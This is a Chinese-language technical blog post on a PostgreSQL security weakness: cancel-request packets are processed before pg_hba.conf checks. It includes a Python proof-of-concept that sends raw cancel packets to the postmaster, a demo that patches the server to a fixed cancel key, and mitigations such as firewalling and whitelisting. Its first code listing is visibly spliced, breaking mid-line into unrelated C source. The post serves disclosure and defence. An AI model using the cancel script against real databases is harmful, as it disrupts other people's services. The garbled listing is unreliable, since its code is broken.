## PostgreSQL cancel 安全漏洞
##### [TAG 6](../class/6.md)
### 作者               
digoal                
### 日期              
2015-09-25                  
### 标签              
PostgreSQL , 数据库安全 , cancel query                                     
----              
## 背景  
数据库端口暴露有什么风险么？  
你可能会觉得，只要密码足够复杂，同时你设置了pg_hba.conf，数据库端口暴露也没有风险。  
可是实际上是这样的吗？     
本文将告诉你潜在风险在哪里。  
## 例子
目前这个数据库只允许unix socket连接，但是监听了所有端口。  
你觉得这样的pg_hba.conf配置安全么？  
```
postgres@digoal-> psql
psql (9.4.4)
Type "help" for help.
postgres=# \q
postgres@digoal-> psql -h 127.0.0.1
psql: SSL error: sslv3 alert handshake failure
FATAL:  no pg_hba.conf entry for host "127.0.0.1", user "postgres", database "postgres", SSL off
```
我们在这个数据库上运行一个LONG SQL。  
```
postgres=# select pg_backend_pid();
 pg_backend_pid 
----------------
          61758
(1 row)
postgres=# select pg_sleep(10000);
```
然后编写一个脚本，目的是通过TCP发cancel请求给postmaster，让postmaster去处理cancel请求。  
需要告诉postmaster两个值，PID和PID对应的 cancel_key。  
PostgreSQL处理CANCEL的消息是在PG_HBA.CONF之前的，这才是风险的关键。  
```
[root@digoal ~]# vi cancel.py 
#!/usr/bin/python
import struct
import socket
import sys
def pg_cancel_query(pid, cancel_key):
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("127.0.0.1",1921))
    buffer = struct.pack('IIII', socket.htonl(16), socket.htonl((1234proto = proto = ntohl(*((ProtocolVersion *) buf));
        if (proto == CANCEL_REQUEST_CODE)
        {
                processCancelRequest(port, buf);
                /* Not really an error, but we don't want to proceed further */
                return STATUS_ERROR;
        }
......
```
postmaster处理cancel请求时，需比对PID和对应的cancel key。  
```
/*
 * The client has sent a cancel request packet, not a normal
 * start-a-new-connection packet.  Perform the necessary processing.
 * Nothing is sent back to the client.
 */
static void
processCancelRequest(Port *port, void *pkt)
{
        CancelRequestPacket *canc = (CancelRequestPacket *) pkt;
        int                     backendPID;
        long            cancelAuthCode;
        Backend    *bp;
#ifndef EXEC_BACKEND
        dlist_iter      iter;
#else
        int                     i;
#endif
        backendPID = (int) ntohl(canc->backendPID);
        cancelAuthCode = (long) ntohl(canc->cancelAuthCode);
        /*
         * See if we have a matching backend.  In the EXEC_BACKEND case, we can no
         * longer access the postmaster's own backend list, and must rely on the
         * duplicate array in shared memory.
         */
#ifndef EXEC_BACKEND
        dlist_foreach(iter, &BackendList)
        {
                bp = dlist_container(Backend, elem, iter.cur);
#else
        for (i = MaxLivePostmasterChildren() - 1; i >= 0; i--)
        {
                bp = (Backend *) &ShmemBackendArray[i];
#endif
                if (bp->pid == backendPID)  // 比对backend process 的PID
                {
                        if (bp->cancel_key == cancelAuthCode)  //  比对backend process 对应的cancel_key
                        {
                                /* Found a match; signal that backend to cancel current op */
                                ereport(DEBUG2,
                                                (errmsg_internal("processing cancel request: sending SIGINT to process %d",
                                                                                 backendPID)));
                                signal_child(bp->pid, SIGINT);  // 发cancel信号
                        }
                        else
                                /* Right PID, wrong key: no way, Jose */
                                ereport(LOG,
                                                (errmsg("wrong key in cancel request for process %d",
                                                                backendPID)));
                        return;
                }
        }
        /* No matching backend */
        ereport(LOG,
                        (errmsg("PID %d in cancel request did not match any process",
                                        backendPID)));
}
```
流程  
```
PostmasterMain
ServerLoop
BackendStartup
fork_process
BackendInitialize
ProcessStartupPacket
processCancelRequest
```
## 风险演示   
```
vi src/backend/postmaster/postmaster.c
static int
BackendStartup(Port *port)
{
        // MyCancelKey = PostmasterRandom();  // 注释掉随机码，
        MyCancelKey = (long) 100;  // 使用一个固定值，方便演示
        bn->cancel_key = MyCancelKey;
......
make && make install
pg_ctl restart -m fast
[root@digoal ~]# vi cancel.py 
#!/usr/bin/python
import struct
import socket
import sys
def pg_cancel_query(pid, cancel_key):
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("127.0.0.1",1921))
    buffer = struct.pack('IIII', socket.htonl(16), socket.htonl((1234<<16)|(5678)),\
            socket.htonl(int(pid)), socket.htonl(int(cancel_key)))
    s.send(buffer)
    # log.info("cancel query %s: return %s" % (query, s.recv(1024)))
    s.close() 
pg_cancel_query(int(sys.argv[1]),100)
```
现在你可以随意的cancel了。  
```
postgres=# select pg_backend_pid();
 pg_backend_pid 
----------------
          63988
(1 row)
postgres=# select pg_sleep(10000);
[root@digoal ~]# ./cancel.py 63988
ERROR:  canceling statement due to user request
```
## 风险分析
1\. cancel 请求。  
2\. 即使你不知道PID和cancel key也会造成主节点不断的fork process，创建socket。  
## 防范
1\. 不要暴露端口，通过防火墙来阻挡。  
2\. 如果要暴露，请设置白名单。  
3\. 从源码层加固，但是需要注意psql, 以及其他周边软件可能也是这么来cancel query的。  
所以改动可以考虑从pg_hba.conf入手，必须符合pg_hba.conf的规则才允许cancel请求。  
如果改动了的话，可能造成不兼容。  
如psql相关代码    